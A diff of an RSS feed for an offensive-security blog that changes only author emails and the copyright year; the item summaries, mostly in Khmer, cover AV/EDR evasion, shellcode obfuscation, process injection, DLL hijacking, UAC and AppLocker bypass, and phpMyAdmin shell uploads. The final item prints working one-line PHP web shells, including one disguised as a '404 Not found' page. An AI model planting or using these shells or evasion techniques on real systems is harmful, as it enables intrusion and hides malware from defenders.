@@ -11,9 +11,9 @@
     <description>Recent content in Posts on ThikLab - CyberSec</description>
     <generator>Hugo -- gohugo.io</generator>
     <language>en</language>
-    <managingEditor>thiklife403@gmail.com (Thik)</managingEditor>
-    <webMaster>thiklife403@gmail.com (Thik)</webMaster>
-    <copyright><a rel='license' target='_blank' href='http://creativecommons.org/licenses/by-sa/4.0/'><img alt='Creative Commons License' style='border-width:0;display:block;margin-left:auto;margin-right:auto;' src='https://i.creativecommons.org/l/by-sa/4.0/88x31.png' /></a>©2020 - 2023 All content is licensed under <a rel='license' target='_blank' href='http://creativecommons.org/licenses/by-sa/4.0/'>CC BY-SA</a>.</copyright>
+    <managingEditor>leangputthik@protonmail.com (Thik)</managingEditor>
+    <webMaster>leangputthik@protonmail.com (Thik)</webMaster>
+    <copyright><a rel='license' target='_blank' href='http://creativecommons.org/licenses/by-sa/4.0/'><img alt='Creative Commons License' style='border-width:0;display:block;margin-left:auto;margin-right:auto;' src='https://i.creativecommons.org/l/by-sa/4.0/88x31.png' /></a>©2020 - 2024 All content is licensed under <a rel='license' target='_blank' href='http://creativecommons.org/licenses/by-sa/4.0/'>CC BY-SA</a>.</copyright>
     <lastBuildDate>Wed, 09 Aug 2023 21:01:06 +0700</lastBuildDate>
     
         <atom:link href="https://th1k.github.io/en/posts/index.xml" rel="self" type="application/rss+xml" />
@@ -24,7 +24,7 @@
         <title>MSFvenom:- Raw2Shellcode and Remove Garbage</title>
         <link>https://th1k.github.io/en/posts/msfveom-raw2shellcode/</link>
         <pubDate>Wed, 09 Aug 2023 21:01:06 +0700</pubDate>
-        <author>thiklife403@gmail.com (Thik)</author>
+        <author>leangputthik@protonmail.com (Thik)</author>
         <atom:modified>Wed, 09 Aug 2023 21:01:06 +0700</atom:modified>
         <guid>https://th1k.github.io/en/posts/msfveom-raw2shellcode/</guid>
         <description>ក្នុងអត្ថបទនេះយើងនឹងមកដឹងអំពីវិធីបំប្លែង​ឯកសារ Payload ឫ Beacons ផ្សេងៗដែលជាឯកសារប្រភេទ Raw ឲ្យទៅជា Shellcode ដើម្បីដាក់បញ្ចូលទៅក្នុងភាសារ C ក្នុងការបង្កើតជា Custom Payloads ជំនួសវិញ ។
@@ -68,7 +68,7 @@ Shellcode2Raw ខាងក្រោមនេះគឺជាគន្លឹះក
         <title>Best Way To Obfuscate a Batch File</title>
         <link>https://th1k.github.io/en/posts/batch-file-obfuscation/</link>
         <pubDate>Wed, 12 Jul 2023 21:01:06 +0700</pubDate>
-        <author>thiklife403@gmail.com (Thik)</author>
+        <author>leangputthik@protonmail.com (Thik)</author>
         <atom:modified>Wed, 12 Jul 2023 21:01:06 +0700</atom:modified>
         <guid>https://th1k.github.io/en/posts/batch-file-obfuscation/</guid>
         <description>ខាងក្រោមនេះជាកូដសម្រាប់ធ្វើការ Obfuscate ទៅលើ Batch Script ដោយធ្វើការបំប្លែងកូដទាំងនោះទៅជាភាសារផ្សេងមួយទៀតដែលពិបាកយល់ ។
@@ -110,7 +110,7 @@ PWN the Script 1 2 3 4 5 6 7 8 9 10 11 12  @echo off if &amp;#34;%~1&amp;#34;==&
         <title>Hijacking Digital Signatures</title>
         <link>https://th1k.github.io/en/posts/hijacking-digital-signatures/</link>
         <pubDate>Sat, 08 Jul 2023 16:22:34 +0700</pubDate>
-        <author>thiklife403@gmail.com (Thik)</author>
+        <author>leangputthik@protonmail.com (Thik)</author>
         <atom:modified>Sat, 08 Jul 2023 16:22:34 +0700</atom:modified>
         <guid>https://th1k.github.io/en/posts/hijacking-digital-signatures/</guid>
         <description>មានវិធីសាស្ត្រជាច្រើនក្នុងការលួចយក ឬ ចម្លងយក Digital Signatures ចេញពីឯកសារពិតប្រាកដណាមួយនៅក្នុងប្រព័ន្ធវីនដូ ។ តែថ្ងៃនេះយើងនឹងមកមើលឧបករណ៍មួយដែលអាចជួយឲ្យមានភាពងាយស្រួលក្នុងការលួចយក Signatures ដែលមាននៅក្នុងឯកសារ Binary រួចដាក់បញ្ជូលទៅក្នុង Payload បានយ៉ាងឆាប់រហ័ស ។
@@ -152,7 +152,7 @@ Digital Signatures Hijacking Tools SigThif ងាយៗជាមួយ SigThif �
         <title>DLL Hijacking Attack 0x01</title>
         <link>https://th1k.github.io/en/posts/dll-hijacking-0x01/</link>
         <pubDate>Fri, 07 Jul 2023 21:01:06 +0700</pubDate>
-        <author>thiklife403@gmail.com (Thik)</author>
+        <author>leangputthik@protonmail.com (Thik)</author>
         <atom:modified>Fri, 07 Jul 2023 21:01:06 +0700</atom:modified>
         <guid>https://th1k.github.io/en/posts/dll-hijacking-0x01/</guid>
         <description>DLL hijacking ឬដែលគេត្រូវបានស្គាល់ថាជា DLL preloading ឬ DLL side-loading គឺជាវិធីសាស្ត្រវាយប្រហារដោយធ្វើការបោកបញ្ឆោតរាល់កម្មវិធី (Software) ដែលមាននៅក្នុងប្រព័ន្ធប្រតិបត្តិការវីនដូទាំងអស់ក្នុងការព្យាយាមបើកដំណើរការ DLL ដែលមានបង្កប់នូវមេរោគជាជាងបើកដំណើរការ DLL មែនទែននៃកម្មវិធី ។
@@ -197,7 +197,7 @@ Exploation Path ដំបូងយើងត្រូវការ DLL Payload ដ
         <title>Malicious Alternate Data Streams In Windows</title>
         <link>https://th1k.github.io/en/posts/malicious-alternate-data-streams/</link>
         <pubDate>Wed, 05 Jul 2023 21:01:06 +0700</pubDate>
-        <author>thiklife403@gmail.com (Thik)</author>
+        <author>leangputthik@protonmail.com (Thik)</author>
         <atom:modified>Wed, 05 Jul 2023 21:01:06 +0700</atom:modified>
         <guid>https://th1k.github.io/en/posts/malicious-alternate-data-streams/</guid>
         <description>ជាគោលគំនិតក្នុងការលាក់ Payload ក្នុង ADS ដោយប្រើប្រាស់ Certutil ។
@@ -242,7 +242,7 @@ Generate ADS ខាងក្រោមជាដំណើរការក្នុ�
         <title>Encrypting Shellcode with XOR In C</title>
         <link>https://th1k.github.io/en/posts/encrypting-shellcode-with-xor-in-c/</link>
         <pubDate>Fri, 30 Jun 2023 21:01:06 +0700</pubDate>
-        <author>thiklife403@gmail.com (Thik)</author>
+        <author>leangputthik@protonmail.com (Thik)</author>
         <atom:modified>Fri, 30 Jun 2023 21:01:06 +0700</atom:modified>
         <guid>https://th1k.github.io/en/posts/encrypting-shellcode-with-xor-in-c/</guid>
         <description>Summary ខាងក្រោមជាការបង្កើត Shellcode និងធ្វើកូដនីយកម្ម XOR ដើម្បីបញ្ចៀសពីការរកឃើញរបស់កម្មវិធីកំចាត់មេរោគ ។
@@ -288,7 +288,7 @@ Generate Shellcode ខាងក្រោមជាដំណើរការបង�
         <title>Evading AV/EDR with Curl Command</title>
         <link>https://th1k.github.io/en/posts/evading-avedr-with-c-curl-command/</link>
         <pubDate>Thu, 29 Jun 2023 21:01:06 +0700</pubDate>
-        <author>thiklife403@gmail.com (Thik)</author>
+        <author>leangputthik@protonmail.com (Thik)</author>
         <atom:modified>Thu, 29 Jun 2023 21:01:06 +0700</atom:modified>
         <guid>https://th1k.github.io/en/posts/evading-avedr-with-c-curl-command/</guid>
         <description>ខ្លីៗអំពីការ Bypass AV/EDR តាមរយៈពាក្យបញ្ជា Curl ដោយប្រើប្រាស់ភាសា C ។
@@ -332,7 +332,7 @@ Generate Payload ខាងក្រោមជាដំណើរការបង្
         <title>Evading AV/EDR with Junk Bytes</title>
         <link>https://th1k.github.io/en/posts/evading-avedr-with-junk-bytes/</link>
         <pubDate>Tue, 27 Jun 2023 21:01:06 +0700</pubDate>
-        <author>thiklife403@gmail.com (Thik)</author>
+        <author>leangputthik@protonmail.com (Thik)</author>
         <atom:modified>Tue, 27 Jun 2023 21:01:06 +0700</atom:modified>
         <guid>https://th1k.github.io/en/posts/evading-avedr-with-junk-bytes/</guid>
         <description>ខ្លះៗអំពីការ Bypass AV/EDR តាមរយៈ Msfvenom ។
@@ -376,7 +376,7 @@ Generate Payload ខាងក្រោមជាដំណើរការបង្
         <title>Process Injection - Bypass AV/EDR with XOR - 0x01</title>
         <link>https://th1k.github.io/en/posts/process-injection-bypass-avedr-with-xor-0x01/</link>
         <pubDate>Wed, 21 Jun 2023 21:01:06 +0700</pubDate>
-        <author>thiklife403@gmail.com (Thik)</author>
+        <author>leangputthik@protonmail.com (Thik)</author>
         <atom:modified>Wed, 21 Jun 2023 21:01:06 +0700</atom:modified>
         <guid>https://th1k.github.io/en/posts/process-injection-bypass-avedr-with-xor-0x01/</guid>
         <description>Summary នៅក្នុងអត្ថបទនេះយើងនឹងធ្វើការបង្កើត Shellcode តាមរយៈវិធីសាស្ត្រ Process Injection ដោយភ្ជាប់ជាមួយនិងការដាក់នូវកូនសោរ XOR ក្នុងការធ្វើកូដនីយកម្មដើម្បីបញ្ចៀសពីការរកឃើញរបស់កម្មវិធីកំចាត់មេរោគ ។
@@ -423,7 +423,7 @@ Shellcode ខាងក្រោមជាដំណើរការបង្កើ�
         <title>Process Injection without Write/Execute Permission</title>
         <link>https://th1k.github.io/en/posts/process-injection-without-write-exec-permission/</link>
         <pubDate>Wed, 21 Jun 2023 21:01:06 +0700</pubDate>
-        <author>thiklife403@gmail.com (Thik)</author>
+        <author>leangputthik@protonmail.com (Thik)</author>
         <atom:modified>Wed, 21 Jun 2023 21:01:06 +0700</atom:modified>
         <guid>https://th1k.github.io/en/posts/process-injection-without-write-exec-permission/</guid>
         <description>Pwn Self Injection បង្កើត Payload ដោយប្រើប្រាស់ Shellcode ជាភាសារ C គោលដៅលើម៉ាស៊ីន 64 bit ។
@@ -461,7 +461,7 @@ Shellcode ខាងក្រោមជាដំណើរការបង្កើ�
         <title>Process Injection - Self Injection Method</title>
         <link>https://th1k.github.io/en/posts/process-injection-self-injection-method/</link>
         <pubDate>Tue, 20 Jun 2023 21:01:06 +0700</pubDate>
-        <author>thiklife403@gmail.com (Thik)</author>
+        <author>leangputthik@protonmail.com (Thik)</author>
         <atom:modified>Tue, 20 Jun 2023 21:01:06 +0700</atom:modified>
         <guid>https://th1k.github.io/en/posts/process-injection-self-injection-method/</guid>
         <description>Self-Injection Payload ខាងក្រោមជាដំណើរការបង្កើត Payload ដោយប្រើប្រាស់ Shellcode ជាភាសារ C គោលដៅលើម៉ាស៊ីន 64 bit ។
@@ -499,7 +499,7 @@ Shellcode ខាងក្រោមជាដំណើរការបង្កើ�
         <title>CobaltStrike Over WAN Connection</title>
         <link>https://th1k.github.io/en/posts/cobaltstrike-overwan-connection/</link>
         <pubDate>Tue, 06 Dec 2022 22:01:06 +0700</pubDate>
-        <author>thiklife403@gmail.com (Thik)</author>
+        <author>leangputthik@protonmail.com (Thik)</author>
         <atom:modified>Tue, 06 Dec 2022 22:01:06 +0700</atom:modified>
         <guid>https://th1k.github.io/en/posts/cobaltstrike-overwan-connection/</guid>
         <description>ខាងក្រោមនេះជាគំនិតផ្ទាល់ខ្លួនក្នុងការតភ្ជាប់ Teamserver និងប្រើប្រាស់ពាក្យបញ្ជាតាមរយៈ Beacons ពីចំងាយដោយមិនចាំបាច់បើក Port Forwarding ។
@@ -545,7 +545,7 @@ Usage តស់! ឥលូវចាប់ផ្ដើមធ្វើការក
         <title>DLL Hijacking - Persistence Method</title>
         <link>https://th1k.github.io/en/posts/dll-hijacking-persistence-method/</link>
         <pubDate>Tue, 06 Dec 2022 21:01:06 +0700</pubDate>
-        <author>thiklife403@gmail.com (Thik)</author>
+        <author>leangputthik@protonmail.com (Thik)</author>
         <atom:modified>Tue, 06 Dec 2022 21:01:06 +0700</atom:modified>
         <guid>https://th1k.github.io/en/posts/dll-hijacking-persistence-method/</guid>
         <description>CPP - Execute Command Prompt ចម្លងកូដ និង កែប្រែទីតាំងរបស់ Payload​ ។
@@ -592,7 +592,7 @@ DLL Build ចូលទៅកាន់ផ្ទាំង Terminal ក្នុង
         <title>1 Byte Changed Evading Antivirus</title>
         <link>https://th1k.github.io/en/posts/1byte-changed-evading-av/</link>
         <pubDate>Sat, 03 Dec 2022 21:01:06 +0700</pubDate>
-        <author>thiklife403@gmail.com (Thik)</author>
+        <author>leangputthik@protonmail.com (Thik)</author>
         <atom:modified>Sat, 03 Dec 2022 21:01:06 +0700</atom:modified>
         <guid>https://th1k.github.io/en/posts/1byte-changed-evading-av/</guid>
         <description>1 Byte Evading ដំបូងយើងត្រូវបង្កើត Shell Code ជាប្រភេទភាសារ C នៅក្នុង Cobalt Strike ដូចរូបខាងក្រោម៖
@@ -630,7 +630,7 @@ DLL Build ចូលទៅកាន់ផ្ទាំង Terminal ក្នុង
         <title>Impersonate SSL - MSF Bypass Detection</title>
         <link>https://th1k.github.io/en/posts/bypass-detection-msf-shell/</link>
         <pubDate>Sat, 03 Dec 2022 21:01:06 +0700</pubDate>
-        <author>thiklife403@gmail.com (Thik)</author>
+        <author>leangputthik@protonmail.com (Thik)</author>
         <atom:modified>Sat, 03 Dec 2022 21:01:06 +0700</atom:modified>
         <guid>https://th1k.github.io/en/posts/bypass-detection-msf-shell/</guid>
         <description>Clone SSL Certification តើអ្នកដឹងទេថា យើងអាចធ្វើការថតចម្លងនូវរាល់ឯកសារ SSL Certificate របស់គេហទំព័រដទៃបាន ដោយប្រើប្រាស់ Module មួយនៅក្នុង Metasploit Framework ដែលត្រូវបានបង្កើតឡើងដោយលោក Chris John Riley ។ ឯកសារដែលត្រូវបានថតចម្លងនោះ នឹងត្រូវរក្សាទុកជាប្រភេទទម្រង់ឯកសារ PEM ហើយវាក៏អាចប្រើប្រាស់បានគ្រប់ប្រភេទ Modules នៅក្នុង Metasploit ផងដែរ។
@@ -679,7 +679,7 @@ Meterpreter Using SSL Connection ខាងក្រោមនេះគឺជា�
         <title>AppLocker Bypass - CMSTP</title>
         <link>https://th1k.github.io/en/posts/applocker-cmstp-bypass/</link>
         <pubDate>Sat, 03 Dec 2022 02:00:06 +0700</pubDate>
-        <author>thiklife403@gmail.com (Thik)</author>
+        <author>leangputthik@protonmail.com (Thik)</author>
         <atom:modified>Sat, 03 Dec 2022 02:00:06 +0700</atom:modified>
         <guid>https://th1k.github.io/en/posts/applocker-cmstp-bypass/</guid>
         <description>ឯកសារ CMSTP ត្រូវបានរក្សាទុកនៅក្នុងថតឯកសារនៃវីនដូ៖
@@ -731,7 +731,7 @@ DLL Metasploit ត្រូវបានប្រើប្រាស់ដើម�
         <title>Bypass UAC DLL Method</title>
         <link>https://th1k.github.io/en/posts/bypass-uac-dll-method/</link>
         <pubDate>Sat, 03 Dec 2022 02:00:06 +0700</pubDate>
-        <author>thiklife403@gmail.com (Thik)</author>
+        <author>leangputthik@protonmail.com (Thik)</author>
         <atom:modified>Sat, 03 Dec 2022 02:00:06 +0700</atom:modified>
         <guid>https://th1k.github.io/en/posts/bypass-uac-dll-method/</guid>
         <description>ដើម្បីធ្វើការ Bypass ទៅលើ UAC នៅរាល់ប្រព័ន្ធប្រតិបត្តិការវីនដូជំនាន់ថ្មី (៨/១០/១១) យើងអាចប្រើប្រាស់ឯកសារ PS1 ដើម្បីបង្កើតចេញជា dll reflection ដែលអាច Exploit តាមរយៈឯកសារដើម cmstp.exe នៃប្រព័ន្ធគោលពីរ។
@@ -772,7 +772,7 @@ C# DLL Reflection Code 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 
         <title>Upload Shell Via phpMyAdmin</title>
         <link>https://th1k.github.io/en/posts/upload-shell-via-phpmyadmin/</link>
         <pubDate>Thu, 01 Apr 2021 10:01:06 +0700</pubDate>
-        <author>thiklife403@gmail.com (Thik)</author>
+        <author>leangputthik@protonmail.com (Thik)</author>
         <atom:modified>Thu, 01 Apr 2021 10:01:06 +0700</atom:modified>
         <guid>https://th1k.github.io/en/posts/upload-shell-via-phpmyadmin/</guid>
         <description>Google Dorks  allinurl:index.php?db=information_schema allinurl:/read_dump.php?  SQL Query ចូលទៅកាន់ផ្ទាំង phpMyAdmin Database ហើយបង្កើត Database ថ្មីមួយ ឧ, &amp;ldquo;uploader&amp;rdquo; បន្ទាប់មកចុចត្រង់ផ្ទាំង SQL ហើយចម្លងចូលនូវកូដខាងក្រោមនេះ៖
@@ -819,7 +819,7 @@ C# DLL Reflection Code 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 
         <title>HackTheBox - Traceback</title>
         <link>https://th1k.github.io/en/posts/traceback-10-10-10-181/</link>
         <pubDate>Sat, 21 Nov 2020 11:38:55 +0700</pubDate>
-        <author>thiklife403@gmail.com (Thik)</author>
+        <author>leangputthik@protonmail.com (Thik)</author>
         <atom:modified>Sat, 21 Nov 2020 11:38:55 +0700</atom:modified>
         <guid>https://th1k.github.io/en/posts/traceback-10-10-10-181/</guid>
         <description>Recon ជាដំបូងខ្ញុំប្រើ Nmap ដើម្បីស្វែងរកផតដែលបានបើក និងសេវាកម្មដែលបានប្រើ
@@ -844,7 +844,7 @@ C# DLL Reflection Code 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 
         <title>Self Signed Certification</title>
         <link>https://th1k.github.io/en/posts/self-signed-certification/</link>
         <pubDate>Tue, 02 Jun 2020 16:22:34 +0700</pubDate>
-        <author>thiklife403@gmail.com (Thik)</author>
+        <author>leangputthik@protonmail.com (Thik)</author>
         <atom:modified>Tue, 02 Jun 2020 16:22:34 +0700</atom:modified>
         <guid>https://th1k.github.io/en/posts/self-signed-certification/</guid>
         <description>តើមានវិធីអ្វីដែលអាចធ្វើ Code Signing ទៅលើ Payload ដែលយើងបានបង្កើតឡើងដោយខ្លួនឯងរួច?
@@ -883,7 +883,7 @@ Import as Trusted Publisher 1  Import-Certificate -FilePath .\code_signing.crt -
         <title>UniSh3ll Tutorial</title>
         <link>https://th1k.github.io/en/posts/unishell/</link>
         <pubDate>Tue, 26 May 2020 14:28:44 +0700</pubDate>
-        <author>thiklife403@gmail.com (Thik)</author>
+        <author>leangputthik@protonmail.com (Thik)</author>
         <atom:modified>Tue, 26 May 2020 14:28:44 +0700</atom:modified>
         <guid>https://th1k.github.io/en/posts/unishell/</guid>
         <description>UniSh3ll-I 1  &amp;lt;?=$_=$_GET;$_[_]($_[0]); //.php?_=system&amp;amp;0=id;ls+-la    UniSh3ll-II 1  echo -e &amp;#34;&amp;lt;?=\`\$_REQUEST[_]\`?&amp;gt;&amp;#34; &amp;gt; unish3ll.php   1  echo -e &amp;#34;&amp;lt;?=\`\$_REQUEST[_]\`?&amp;gt;\r&amp;lt;?=&amp;#39;404 Not found&amp;#39;;?&amp;gt;&amp;#34; &amp;gt; unish3ll.php   របៀបប្រើ៖ curl localhost/unish3ll.php -d _=ls+-la
